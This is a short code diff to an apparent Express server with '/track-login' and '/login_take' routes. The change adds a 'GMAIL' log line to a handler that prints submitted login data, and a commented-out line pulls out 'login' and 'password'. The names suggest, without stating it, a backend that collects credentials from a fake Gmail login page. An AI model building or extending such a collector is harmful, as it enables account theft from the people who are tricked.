@@ -25,6 +25,7 @@ app.post("/track-login", (req, res) => {
 });
 
 app.post("/login_take", (req, res) => {
+    console.log("GMAIL");
     console.log(req.body);
     //const { login, password } = req.body;
 
